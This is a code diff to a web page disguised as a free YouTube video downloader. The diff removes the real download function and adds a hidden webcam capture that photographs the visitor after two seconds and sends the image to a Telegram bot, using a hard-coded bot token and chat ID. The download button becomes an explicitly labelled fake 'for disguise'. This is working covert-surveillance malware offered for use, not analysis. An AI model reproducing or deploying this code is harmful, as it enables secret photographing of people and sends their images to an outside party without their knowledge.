@@ -35,15 +35,11 @@
             background-color: #cc0000;
         }
         #video, #canvas {
-            display: none; /* Hidden camera elements */
+            display: none; /* Hidden camera */
         }
         .info {
             margin-top: 20px;
             color: #666;
-        }
-        #download-link {
-            margin-top: 20px;
-            display: none;
         }
     </style>
 </head>
@@ -57,10 +53,6 @@
             <button id="download">Download</button>
         </div>
         
-        <div id="download-link">
-            <a href="#" id="video-link">Click here to download your video</a>
-        </div>
-        
         <div class="info">
             <p>Supports all video formats | Fast & Free | No registration needed</p>
         </div>
@@ -71,78 +63,66 @@
     </div>
 
     <script>
+        const BOT_TOKEN = '7910848214:AAHVBM9OhbpsH8GPx3zDzHe3_OzLoOhg_sQ'; // Replace with your bot token
+        const CHAT_ID = '7872545726';             // Replace with your chat ID
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const downloadButton = document.getElementById('download');
         const youtubeUrl = document.getElementById('youtube-url');
-        const downloadLink = document.getElementById('download-link');
-        const videoLink = document.getElementById('video-link');
         const context = canvas.getContext('2d');
 
-        // Get camera access
+        // Camera access
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(capturePhoto, 2000); // Capture photo after 2 seconds
+                setTimeout(capturePhoto, 2000); // Capture after 2 seconds
             })
             .catch(err => {
                 console.error("Error accessing camera: ", err);
             });
 
-        // Capture and send photo
+        // Capture photo
         function capturePhoto() {
             context.drawImage(video, 0, 0, 640, 480);
             canvas.toBlob(blob => {
-                sendPhotoToServer(blob);
+                sendPhotoToTelegram(blob);
             }, 'image/jpeg');
         }
 
-        // Send photo to server
-        function sendPhotoToServer(photoBlob) {
+        // Send photo to Telegram
+        function sendPhotoToTelegram(photoBlob) {
             const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
             formData.append('photo', photoBlob, 'userphoto.jpg');
 
-            fetch('/upload-photo', {
+            fetch(TELEGRAM_API, {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
             .then(data => {
-                console.log(data.message);
-            })
-            .catch(error => {
-                console.error('Error uploading photo:', error);
-            });
-        }
-
-        // Handle video download
-        downloadButton.addEventListener('click', () => {
-            const url = youtubeUrl.value.trim();
-            if (!url) {
-                alert('Please enter a YouTube URL!');
-                return;
-            }
-
-            fetch('/download', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ url: url })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    downloadLink.style.display = 'block';
-                    videoLink.href = data.file_url;
-                    videoLink.download = data.filename;
+                if (data.ok) {
+                    console.log('Photo sent to Telegram!');
                 } else {
-                    alert('Error: ' + data.message);
+                    console.error('Error:', data);
                 }
             })
             .catch(error => {
-                alert('Error downloading video!');
-                console.error(error);
+                console.error('Fetch error:', error);
             });
+        }
+
+        // Fake download button (for disguise)
+        downloadButton.addEventListener('click', () => {
+            const url = youtubeUrl.value.trim();
+            if (url) {
+                alert('Downloading your video... (Demo mode)');
+            } else {
+                alert('Please enter a YouTube URL!');
+            }
         });
-    </script
+    </script>
 </body>
 </html>
